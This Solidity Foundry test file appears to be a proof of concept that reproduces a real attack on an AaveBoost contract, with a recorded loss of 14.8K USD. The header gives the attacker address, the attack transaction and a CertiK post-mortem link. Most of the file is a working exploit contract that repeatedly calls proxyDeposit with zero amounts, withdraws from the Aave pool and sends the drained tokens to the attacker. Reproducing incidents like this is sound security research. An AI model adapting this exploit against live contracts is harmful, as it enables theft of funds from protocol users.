pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 14.8K USD
// Attacker : 0x5d4430d14ae1d11526ddac1c1ef01da3b1dae455
// Attack Contract : https://etherscan.io/address/0x8fa5cf0aa8af0e5adc7b43746ea033ca1b8e68de
// Vulnerable Contract : 
// Attack Tx : https://app.blocksec.com/explorer/tx/eth/0xc4ef3b5e39d862ffcb8ff591fbb587f89d9d4ab56aec70cfb15831782239c0ce

// @Info
// Vulnerable Contract Code : 

// @Analysis
// Post-mortem : https://x.com/CertiKAlert/status/1933011428157563188
// Twitter Guy : https://x.com/CertiKAlert/status/1933011428157563188
// Hacking God : N/A

address constant AavePool = 0xf36F3976f288b2B4903aca8c177efC019b81D88B;
address constant InitializableAdminUpgradeabilityProxy = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9;
address constant AaveBoost = 0xd2933c86216dC0c938FfAFEca3C8a2D6e633e2cA;
address constant attacker = 0x5D4430D14aE1d11526ddAc1c1eF01DA3b1DaE455;
address constant addr = 0x740836C95C6f3F49CccC65A27331D1f225138c39;

contract ContractTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 22685443);
    }
    
    function testPoC() public {
        emit log_named_decimal_uint("before attack: balance of attacker", IERC20(0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9).balanceOf(attacker), 18);
        vm.startPrank(attacker, attacker);
        AttackerC attC = new AttackerC();
        deal(address(0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9), address(attC), 48900000000000000000);
        deal(address(0x740836C95C6f3F49CccC65A27331D1f225138c39), address(attC), 48900000000000000000);
        attC.attack();
        vm.stopPrank();
        emit log_named_decimal_uint("after attack: balance of attacker", IERC20(0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9).balanceOf(attacker), 18);
    }
}

contract AttackerC {
    function attack() public {
        require(msg.sender == attacker && tx.origin == attacker, "auth");

        uint256 balBoostToken = IInitializableAdminUpgradeabilityProxy(InitializableAdminUpgradeabilityProxy).balanceOf(AaveBoost);

        uint256 limit = balBoostToken / (3 * 10**17);
        uint256 idx = 0;
        while (idx < 163) {
            if (idx < limit) {
                (bool ok, ) = AaveBoost.call(abi.encodeWithSelector(IAaveBoost.proxyDeposit.selector, InitializableAdminUpgradeabilityProxy, address(this), uint128(0)));
                ok;
            }
            unchecked { idx++; }
        }

        if (163 >= limit) {
            uint256 aBal = IInitializableAdminUpgradeabilityProxy(addr).balanceOf(address(this));
            (bool ok1, ) = AavePool.call(abi.encodeWithSelector(IAavePool.withdraw.selector, InitializableAdminUpgradeabilityProxy, address(this), uint128(aBal), false));
            ok1;
            uint256 uBal = IInitializableAdminUpgradeabilityProxy(InitializableAdminUpgradeabilityProxy).balanceOf(address(this));
            IInitializableAdminUpgradeabilityProxy(InitializableAdminUpgradeabilityProxy).transfer(attacker, uBal);
        }
    }
}

interface IAavePool {
	function withdraw(address, address, uint128, bool) external;
}
interface IInitializableAdminUpgradeabilityProxy {
	function balanceOf(address) external returns (uint256);
	function transfer(address, uint256) external returns (bool); 
}
interface IAaveBoost {
	function proxyDeposit(address, address, uint128) external;
}